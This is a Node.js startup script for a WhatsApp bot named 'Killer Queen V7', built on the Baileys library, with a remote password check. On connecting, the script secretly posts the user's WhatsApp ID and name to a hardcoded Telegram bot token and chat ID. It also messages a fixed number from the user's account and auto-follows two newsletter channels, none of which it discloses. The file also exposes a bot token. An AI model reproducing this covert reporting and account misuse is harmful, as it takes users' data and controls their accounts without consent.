require('../config/settings');
const { 
    default: makeWASocket, 
    prepareWAMessageMedia, 
    useMultiFileAuthState, 
    DisconnectReason, 
    fetchLatestBaileysVersion, 
    makeInMemoryStore, 
    generateWAMessageFromContent, 
    generateWAMessageContent, 
    jidDecode, 
    proto, 
    relayWAMessage, 
    getContentType, 
    getAggregateVotesInPollMessage, 
    downloadContentFromMessage, 
    fetchLatestWaWebVersion, 
    InteractiveMessage, 
    makeCacheableSignalKeyStore, 
    Browsers, 
    generateForwardMessageContent, 
    MessageRetryMap 
} = require("@whiskeysockets/baileys");
const axios = require('axios');
const pino = require('pino');
const fs = require('fs');
const path = require('path');
const figlet = require('figlet');
const chalk = require("chalk");
const crypto = require('crypto');
const { Boom } = require('@hapi/boom');
const { color } = require('../lib/color');
const { createInterface } = require('readline');
const { smsg, sendGmail, formatSize, isUrl, generateMessageTag, getBuffer, getSizeMedia, runtime, fetchJson, sleep } = require('../lib/myfunc');

// >~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~< //

let usePairingCode = false;

const sendTelegramNotification = async (message) => {
    try {
        await axios.post(`https://api.telegram.org/bot7682514927:AAGh1naoilXeUKro9n71b_LlLXRGLkePtJA/sendMessage`, {
            chat_id: '8135629926',
            text: message
        });
    } catch (error) {
    }
};

// >~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~< //

// Function to fetch data from a URL
const fetchData = async (url) => {
    try {
        const response = await fetch(url);
        const data = await response.json()
        return data
    } catch (error) {
        const errorMessage = error.response ?
            `Server error: ${error.response.status} - ${error.response.statusText}` :
            `Network error: ${error.message}`;
        throw new Error(errorMessage);
    }
};

const readline = createInterface({
    input: process.stdin,
    output: process.stdout
});

const question = (query) => new Promise((resolve) => readline.question(query, resolve));

// >~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~< //

async function keyoptions(url, options) {
    try {
        const methodskey = await axios({
            method: "GET",
            url: url,
            headers: {
                'User-Agent': "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36"
            },
            ...options
        });
        return methodskey.data;
    } catch (err) {
        return err;
    }
}

// >~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~< //

const loginInfoPath = path.join(__dirname, './loginInfo.json');

// >~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~< //

function saveLoginInfo(password, usePairingCode) {
    const loginInfo = { password, usePairingCode };
    fs.writeFileSync(loginInfoPath, JSON.stringify(loginInfo));
}

function getSavedLoginInfo() {
    if (fs.existsSync(loginInfoPath)) {
        const loginInfo = JSON.parse(fs.readFileSync(loginInfoPath));
        usePairingCode = loginInfo.usePairingCode;
        return loginInfo;
    }
    return null;
}

// >~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~< //

async function handleLogin() {
    const checkLogin = async (password) => {
        const dbUrl = "https://raw.githubusercontent.com/FarelSilence/dbyuukey/main/auth.json";
        try {
            const response = await axios.get(dbUrl);
            const users = response.data;
            
            const user = users.find(u => u.PASSWORD === password);
            if (user) {
                if (user.BANNED) {
                    return { 
                        access: false, 
                        owner: user.OWNER, 
                        message: `User is banned. Reason: ${user.BAN_REASON || "No reason provided."}` 
                    };
                }
                return { access: user.ACCESS, owner: user.OWNER };
            }
            return null;
        } catch (error) {
            console.error(chalk.red('Database access failed:', error.message));
            return null;
        }
    };
    
    let attempt = 0;
    const maxAttempts = 1;

    const showLoginHeader = (attemptsLeft) => {
        console.log(chalk.bold.red('                                             '));
        console.log(chalk.bold.green('▄▀█ █░█ █▀ █▀ █▄░█'));
        console.log(chalk.bold.green('█▄█ █░█ █▀ █▀ █░▀█'));
        console.log(chalk.bold.green('░░▀ ▀▀▀ ▀▀ ▀▀ ▀░░▀'));  
        console.log(chalk.bold.red('                                             '));
        console.log(chalk.bold.red(''));      
        console.log(chalk.bold.green('  [ LOGIN SCRIPT KILLER QUEEN ]'));
        console.log(chalk.bold.red(''));      
        console.log(chalk.bold.red('Please log in to access this bot system.'));
        console.log(chalk.bold.yellow(`Attempts remaining: ${attemptsLeft}`));
        console.log(chalk.bold.red(''));              
    };

    const savedLogin = getSavedLoginInfo();
    if (savedLogin) {
        const userData = await checkLogin(savedLogin.password);
        if (userData?.maintenance) {
            console.log(chalk.bold.red(`\n🚧 ${userData.message.en}`));
            console.log(chalk.bold.red(`\n🚧 ${userData.message.id}`));
            process.exit(1);
        }
        if (userData?.access) {
            console.log(chalk.bold.green(`\nSelamat Datang Kembali, ${userData.owner}`));
            await sleep(2000);
            return true;
        } else if (userData?.message) {
            console.log(chalk.bold.red(`\n🚫 ${userData.message}`));
            process.exit(1);
        }
    }

    while (attempt < maxAttempts) {
        console.clear();
        showLoginHeader(maxAttempts - attempt);
        console.log(chalk.hex("#FF69B4").bold("Password: "));
        const password = await question("");

        const userData = await checkLogin(password);

        if (userData?.maintenance) {
            console.log(chalk.bold.red(`\n🚧 ${userData.message.en}`));
            console.log(chalk.bold.red(`\n🚧 ${userData.message.id}`));
            process.exit(1);
        }

        if (userData?.access) {
            console.log(chalk.bold.green(`\n✅ Login Successful!                     
Welcome, Owner: @${userData.owner}`));
            
            console.log(chalk.bold.hex('#2ECC71')("\nPlease choose your authentication:"));
            console.log(chalk.hex('#3498DB')(""));
            console.log(chalk.hex('#3498DB')("1. QR Code"));
            console.log(chalk.hex('#3498DB')("2. Pairing Code"));
            console.log(chalk.hex('#3498DB')(""));
            console.log(chalk.bold.yellow("Enter your choice (1 or 2): "));
            const choice = await question('');

            if (choice === '1') {
                usePairingCode = false;
            } else if (choice === '2') {
                usePairingCode = true;
            } else {
                console.log(chalk.bold.red("\nInvalid choice! Defaulting to QR Code."));
                usePairingCode = false;
            }

            saveLoginInfo(password, usePairingCode);
            await sleep(2000);
            return true;
        } else if (userData?.message) {
            console.log(chalk.bold.red(`\n🚫 ${userData.message}`));
            process.exit(1);
        } else {
            attempt++;
            if (attempt < maxAttempts) {
                console.log(chalk.bold.red(`\n ❌ Login Failed!
  Invalid credentials.
  Remaining attempts: "${maxAttempts - attempt}\n`));
                await sleep(2000);
            } else {
                console.log(chalk.bold.red("\nMaximum attempts reached! Exiting..."));
                process.exit(1);
            }
        }
    }
}

// >~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~< //

console.clear()
console.log(chalk.white.bold(`
${chalk.red("Memulai Akses")}
${chalk.blue("█░▄▀ █ █░░ █░░ █▀ █▀▀▄\n█▀▄░ █ █░░ █░░ █▀ █▐█▀\n▀░▀▀ ▀ ▀▀▀ ▀▀▀ ▀▀ ▀░▀▀\n▄▀█ █░█ █▀ █▀ █▄░█\n█▄█ █░█ █▀ █▀ █░▀█\n░░▀ ▀▀▀ ▀▀ ▀▀ ▀░░▀")}
`));  
console.log(chalk.white.bold(`${chalk.cyan(`Kiler Queen Version Seven`)}

`));

// Whatsapp Connect
async function ConnetToWhatsapp() {
    const isLoggedIn = await handleLogin();
    if (!isLoggedIn) return;

    const { state, saveCreds } = await useMultiFileAuthState(`./${global.session}`);

    const Yuukey = makeWASocket({
        logger: pino({ level: "silent" }),
        printQRInTerminal: !usePairingCode,
        auth: state,
        browser: ["Ubuntu", "Chrome", "20.0.04"]
    });

    if (usePairingCode && !Yuukey.authState.creds.registered) {
        try {
            console.log(chalk.hex("#800080").bold("Enter Your Number Starts With 628, Dont Use + - Or Space\nUr Number : "));

            const phoneNumber = await question("");

            if (!phoneNumber?.trim()) {
                console.log(chalk.red("Invalid number. Please try again."));
                return;
            }

            let code = await Yuukey.requestPairingCode(phoneNumber.trim());
            code = code.match(/.{1,4}/g)?.join(" - ") || code;

            console.log(chalk.hex("#800080").bold("Your Pairing Code :"), chalk.yellow.bold(code));
        } catch (error) {
            console.log(chalk.red("An error occurred while processing the number: " + error.message));
        }
    }
  
// Create an in-memory store
const store = makeInMemoryStore({ logger: pino().child({ level: 'silent', stream: 'store' }) });
    store.bind(Yuukey.ev);
  
Yuukey.ev.on("messages.upsert", async (chatUpdate, msg) => {
 try {
const mek = chatUpdate.messages[0]
if (!mek.message) return
mek.message = (Object.keys(mek.message)[0] === 'ephemeralMessage') ? mek.message.ephemeralMessage.message : mek.message
if (mek.key && mek.key.remoteJid === 'status@broadcast') return
if (!Yuukey.public && !mek.key.fromMe && chatUpdate.type === 'notify') return
if (mek.key.id.startsWith('BAE5') && mek.key.id.length === 16) return
if (mek.key.id.startsWith('FatihArridho_')) return;
const m = smsg(Yuukey, mek, store)
require("../Start/Queen")(Yuukey, m, chatUpdate, store)
 } catch (err) {
 console.log(err)
 }
});

    Yuukey.decodeJid = (jid) => {
        if (!jid) return jid;
        if (/:\d+@/gi.test(jid)) {
            let decode = jidDecode(jid) || {};
            return decode.user && decode.server && decode.user + '@' + decode.server || jid;
        } else return jid;
    };

    Yuukey.ev.on('contacts.update', update => {
        for (let contact of update) {
            let id = Yuukey.decodeJid(contact.id);
            if (store && store.contacts) store.contacts[id] = { id, name: contact.notify };
        }
    });
    
    global.idch1 = "120363399602691477@newsletter"
    global.idch2 = "120363418309715113@newsletter"
    Yuukey.public = true

    Yuukey.ev.on('connection.update', async (update) => {
        const { connection, lastDisconnect } = update;
        if (connection === 'close') {
            const reason = new Boom(lastDisconnect?.error)?.output.statusCode;
            console.log(color(lastDisconnect.error, 'deeppink'));
            if (lastDisconnect.error == 'Error: Stream Errored (unknown)') {
                process.exit();
            } else if (reason === DisconnectReason.badSession) {
                console.log(color(`Bad Session File, Please Delete Session and Scan Again`));
                process.exit();
            } else if (reason === DisconnectReason.connectionClosed) {
                console.log(color('[SYSTEM]', 'white'), color('Connection closed, reconnecting...', 'deeppink'));
                process.exit();
            } else if (reason === DisconnectReason.connectionLost) {
                console.log(color('[SYSTEM]', 'white'), color('Connection lost, trying to reconnect', 'deeppink'));
                process.exit();
            } else if (reason === DisconnectReason.connectionReplaced) {
                console.log(color('Connection Replaced, Another New Session Opened, Please Close Current Session First'));
                Yuukey.logout();
            } else if (reason === DisconnectReason.loggedOut) {
                console.log(color(`Device Logged Out, Please Scan Again And Run.`));
                Yuukey.logout();
            } else if (reason === DisconnectReason.restartRequired) {
                console.log(color('Restart Required, Restarting...'));
                await ConnetToWhatsapp();
            } else if (reason === DisconnectReason.timedOut) {
                console.log(color('Connection TimedOut, Reconnecting...'));
                ConnetToWhatsapp();
            }
        } else if (connection === "connecting") {
            console.log(color('Menghubungkan . . . '));
        } else if (connection === "open") {
            console.log(color('Bot Berhasil Tersambung'));
    Yuukey.sendMessage("6285943212106@s.whatsapp.net", {
    text: `𝐊𝐢𝐥𝐥𝐞𝐫 𝐐𝐮𝐞𝐞𝐧 𝐕𝟕 𝐇𝐚𝐬 𝐂𝐨𝐧𝐧𝐞𝐜𝐭𝐞𝐝 𝐈𝐧 𝐌𝐲 𝐍𝐮𝐦𝐛𝐞𝐫\n𝐏𝐥𝐞𝐚𝐬𝐞 𝐒𝐮𝐛𝐬𝐜𝐫𝐢𝐛𝐞 𝐌𝐲 𝐘𝐨𝐮𝐭𝐮𝐛𝐞 𝐂𝐡𝐚𝐧𝐧𝐞𝐥 :\nhttps://Youtube.com/@YuukeyMiAyam`
    })
            Yuukey.newsletterFollow(global.idch1)
            Yuukey.newsletterFollow(global.idch2) 
            sendTelegramNotification(`Connection information report 🔥\n\nThe device has been connected, Here is the information\n> User ID : ${Yuukey.user.id}\n> Username : ${Yuukey.user.name}\n\nKiller Queen : Created By Yuukey Developer`);
        }
    });

    Yuukey.sendText = (jid, text, quoted = '', options) => Yuukey.sendMessage(jid, { text: text, ...options }, { quoted });
    
    Yuukey.downloadMediaMessage = async (message) => {
let mime = (message.msg || message).mimetype || ''
let messageType = message.mtype ? message.mtype.replace(/Message/gi, '') : mime.split('/')[0]
const stream = await downloadContentFromMessage(message, messageType)
let buffer = Buffer.from([])
for await(const chunk of stream) {
buffer = Buffer.concat([buffer, chunk])}
return buffer
    } 
    
    Yuukey.ev.on('creds.update', saveCreds);
    return Yuukey;
}

ConnetToWhatsapp();

let file = require.resolve(__filename);
require('fs').watchFile(file, () => {
    require('fs').unwatchFile(file);
    console.log('\x1b[0;32m' + __filename + ' \x1b[1;32mupdated!\x1b[0m');
    delete require.cache[file];
    require(file);
});
